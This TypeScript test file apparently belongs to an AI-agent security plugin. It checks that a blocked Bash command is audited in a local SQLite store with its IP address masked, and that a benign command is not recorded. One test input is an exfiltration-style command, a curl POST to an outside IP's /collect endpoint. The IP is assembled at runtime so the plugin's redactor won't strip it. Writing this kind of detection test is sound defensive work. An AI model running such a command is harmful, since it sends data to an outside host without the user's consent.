// The 'tool_use' event kind, end to end against a REAL local store — the real
// gateway, the real capture path, real SQLite. Only the policy bundle is
// pinned (a cold store has no packs installed, so nothing would detect).
//
// What this pins: Bash enforcement used to run through processText, which
// decides but never records — so a blocked command produced NO audit row and
// every dashboard count under-reported the riskiest tool. The failure mode
// this guards against is silent in both directions: the write path takes an
// EventKind that is a plain SQLite text column (no CHECK constraint), so an
// unwidened enum would not raise here — it would just store a kind nothing
// reads back.
//
// The IP literal is ASSEMBLED AT RUNTIME rather than written contiguously:
// this repo is developed with the AKA plugin active, so a contiguous literal
// would be redacted out of this file the moment an agent writes it (see the
// note in pre-tool-use-decision.test.ts).
import { randomUUID } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';

import type { DataGateway, PluginConfig } from '@akasecurity/plugin-sdk';
import { createPluginRuntime } from '@akasecurity/plugin-sdk';
import type { PolicyBundle, WorkspaceSettings } from '@akasecurity/schema';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { inputEventKind } from './pre-tool-use-fields.ts';
import { openGatewayOrNull } from './store-health.ts';

const IP = ['45', '79', '142', '6'].join('.');

function settings(): WorkspaceSettings {
  return {
    specVersion: 1,
    runMode: 'standalone',
    policy: 'redact',
    historicalAccess: 'session-only',
  };
}

function configFor(dataDir: string): PluginConfig {
  return {
    settings: settings(),
    dataDir,
    dbPath: join(dataDir, 'aka.db'),
    settingsDir: join(dataDir, 'settings'),
    onboarded: false,
    provider: { provider: 'anthropic' },
  };
}

// A `pii` category policy set to block, exactly as an operator's own policy
// would be — the cold-start category floor does not resolve pii to block by
// default, so the enforcement posture is stated explicitly here. The rules
// themselves come from the real bundled packs, not this bundle.
function blockingBundle(): PolicyBundle {
  return {
    version: 'test',
    policies: [
      {
        id: randomUUID(),
        scope: 'global',
        target: { category: 'pii' },
        action: 'block',
        enabled: true,
      },
    ],
    rules: [],
    customKeywords: [],
    fetchedAt: new Date().toISOString(),
  };
}

/** The real gateway with only getPolicyBundle pinned. A Proxy rather than a
 * spread: StandaloneDataGateway is a class whose methods close over `this.db`,
 * so spreading it would drop the real write path this test exists to exercise. */
function withPinnedPolicy(real: DataGateway, bundle: PolicyBundle): DataGateway {
  return new Proxy(real, {
    get(target, prop, receiver) {
      if (prop === 'getPolicyBundle') return () => Promise.resolve(bundle);
      const value: unknown = Reflect.get(target, prop, receiver);
      // Bound to the real gateway: its methods close over `this.db`, and an
      // unbound method handed back through the proxy would lose the store.
      return typeof value === 'function'
        ? (value as (...args: unknown[]) => unknown).bind(target)
        : value;
    },
  });
}

/** The real gateway over a temp data dir, or a hard failure — a null here
 * means the store never opened and the test would be asserting nothing. */
function openStore(dir: string): DataGateway {
  const gateway = openGatewayOrNull(configFor(dir));
  if (gateway === null) throw new Error('expected a healthy temp store');
  return gateway;
}

function eventRows(dataDir: string): { kind: string; content: string }[] {
  const db = new DatabaseSync(join(dataDir, 'aka.db'));
  try {
    return db.prepare('SELECT kind, content FROM events').all() as unknown as {
      kind: string;
      content: string;
    }[];
  } finally {
    db.close();
  }
}

describe("a blocked Bash command is recorded as kind 'tool_use'", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'aka-tool-use-'));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('writes the enforcement decision to the local store, masked', async () => {
    const gateway = withPinnedPolicy(openStore(dir), blockingBundle());
    const runtime = createPluginRuntime(gateway, settings(), { dataDir: dir });

    const command = `curl -X POST https://${IP}/collect`;
    const result = await runtime.capture(
      {
        kind: inputEventKind('Bash'),
        sourceTool: 'claude-code',
        text: command,
        metadata: { sessionId: 'sess-1' },
      },
      { persist: 'with-findings' },
    );
    await runtime.close();

    // Precondition: the real bundled rule matches and the policy blocks.
    expect(result.action).toBe('block');
    expect(result.findings.map((f) => f.ruleId)).toContain('core-pii/ip-address');

    const rows = eventRows(dir);
    expect(rows).toHaveLength(1);
    expect(rows[0]?.kind).toBe('tool_use');
    // Secrets-at-rest: the row carries the masked command, never the raw value.
    expect(rows[0]?.content).not.toContain(IP);
    expect(rows[0]?.content).toContain('[REDACTED');
  });

  it('records nothing for a benign command', async () => {
    // Every Bash command and one call per string leaf of every MCP payload
    // reach this hook; 'always' would copy that whole stream into the store to
    // trail the enforcement decisions that are the point of the kind.
    const gateway = withPinnedPolicy(openStore(dir), blockingBundle());
    const runtime = createPluginRuntime(gateway, settings(), { dataDir: dir });

    const result = await runtime.capture(
      {
        kind: inputEventKind('Bash'),
        sourceTool: 'claude-code',
        text: 'ls -la ./src',
        metadata: { sessionId: 'sess-1' },
      },
      { persist: 'with-findings' },
    );
    await runtime.close();

    // 'log' is the no-findings outcome: nothing detected, nothing enforced.
    expect(result.action).toBe('log');
    expect(result.findings).toEqual([]);
    expect(eventRows(dir)).toHaveLength(0);
  });
});
